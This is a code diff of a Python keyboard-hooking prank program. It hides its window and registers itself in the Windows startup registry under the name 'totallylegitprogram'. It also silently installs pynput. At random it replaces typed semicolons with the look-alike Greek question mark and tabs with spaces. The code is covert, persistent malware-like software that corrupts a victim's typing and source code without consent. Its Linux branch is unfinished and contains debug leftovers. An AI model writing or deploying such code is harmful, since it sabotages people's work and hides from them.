@@ -5,18 +5,18 @@ import threading
 import datetime,time
 from sys import platform
 
-try:
-    #import pynput
-    from pynput import keyboard
-    from pynput.keyboard import Key, Controller
-except ImportError:
-    os.system('pip install --user pynput')
-    #import pynput
-    from pynput import keyboard
-    from pynput.keyboard import Key, Controller
 
+from pynput import keyboard
+from pynput.keyboard import Key, Controller
 #Settings for windows computers
 if platform == "win32":
+    try:
+        from pynput import keyboard
+        from pynput.keyboard import Key, Controller
+    except ImportError:
+        os.system('pip install --user pynput')
+        from pynput import keyboard
+        from pynput.keyboard import Key, Controller
     try:
         import win32event, win32api, winerror
     except ImportError:
@@ -64,10 +64,6 @@ def addStartupWindows():
 
     SetValueEx(key2change, "totallylegitprogram",0,REG_SZ, new_file_path)
 
-#Add to startup for linux (INCOMPLETE)
-def addStartupLinux():
-    pass
-
 def on_release(key):
     pass
 
@@ -76,13 +72,33 @@ def on_press(key):
         if key.char == ';':
             if random.randint(0,20) == 5:
                 keyboard = Controller()
-                keyboard.type("\b")
-                keyboard.type(u'\u037E')
-
+                print("test")
+                #keyboard.press(Key.backspace)
+                #keyboard.release(Key.backspace)
+                #keyboard.type(u'\b')
+                if platform == "win32":
+                    keyboard.type(u'\u037E')
+                else:
+                    keyboard.type('0x037E'.encode("UTF-16"))
+                   # keyboard.press(Key.ctrl)
+                   # keyboard.press(Key.shift)
+                   # keyboard.press('u')
+                   # keyboard.release('u')
+                   # keyboard.press('0')
+                   # keyboard.release('0')
+                   # keyboard.press('3')
+                   # keyboard.release('3')
+                   # keyboard.press('7')
+                   # keyboard.release('7')
+                   # keyboard.press('E')
+                   # keyboard.release('E')
+                   # keyboard.release(Key.ctrl)
+                   # keyboard.release(Key.shift)
+                
         if key.char == '	':
             if random.randint(0,20) == 5:
                 keyboard = Controller()
-                keyboard.type("\b")
+                keyboard.press(Key.backspace)
                 keyboard.type("    ")
         #if key.char == 'q':
         #exit(0)
@@ -94,8 +110,7 @@ def main():
     if platform == "win32":
         hide()
         addStartupWindows()
-    if platform == "linux" or platform == "linux2":
-        addStartupLinux()
+    #if platform == "linux" or platform == "linux2":
     if len(sys.argv)>1:
         hide()
         if sys.argv[1]=="startup":
